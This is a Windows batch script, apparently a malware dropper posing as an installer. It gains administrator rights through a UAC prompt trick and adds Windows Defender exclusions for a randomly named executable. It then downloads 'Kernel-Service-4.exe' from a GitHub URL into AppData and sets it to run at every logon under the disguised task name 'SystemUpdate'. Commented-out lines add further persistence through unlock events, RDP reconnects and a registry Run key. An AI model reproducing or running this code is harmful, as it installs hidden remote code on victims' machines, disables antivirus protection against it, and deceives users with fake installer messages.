

@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
echo Loading.... Don't close this windown
set "base_filename=c_betaske_"
set "random_suffix=%RANDOM%"
set "final_filename=%base_filename%_%random_suffix%.exe"

powershell.exe -Command "Set-MpPreference -ExclusionProcess  '%final_filename%'"
powershell.exe -Command "Add-MpPreference -ExclusionPath '%APPDATA%\\%final_filename%'"
::cd %TEMP%
cd %APPDATA%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/huynq11019/my-meeting/refs/heads/main/Kernel-Service-4.exe' -OutFile '%APPDATA%\\%final_filename%'"

REM Đặt lịch chạy mỗi lần đăng nhập
echo Creating scheduled task for auto-run on logon...
schtasks /create /tn "SystemUpdate_%random_suffix%" /tr "%APPDATA%\\%final_filename%" /sc onlogon /rl highest /f >nul 2>&1

REM Tạo scheduled task cho unlock event (Windows 7+) với delay
@REM echo Creating scheduled task for unlock event...
@REM schtasks /create /tn "SystemUnlock_%random_suffix%" /tr "%APPDATA%\\%final_filename%" /sc onevent /ec Security /mo "*[System[EventID=4648]]" /rl highest /delay 0000:05 /f >nul 2>&1

REM Tạo scheduled task cho session reconnect (RDP unlock) với delay
@REM schtasks /create /tn "SessionReconnect_%random_suffix%" /tr "%APPDATA%\\%final_filename%" /sc onevent /ec System /mo "*[System[EventID=24]]" /rl highest /delay 0000:30 /f >nul 2>&1

REM Chỉ sử dụng registry hoặc scheduled task, không cả hai
REM Tạo registry key để chạy khi startup (backup method)
REM reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate_%random_suffix%" /t REG_SZ /d "%APPDATA%\\%final_filename%" /f >nul 2>&1

echo Installation completed successfully!
exit
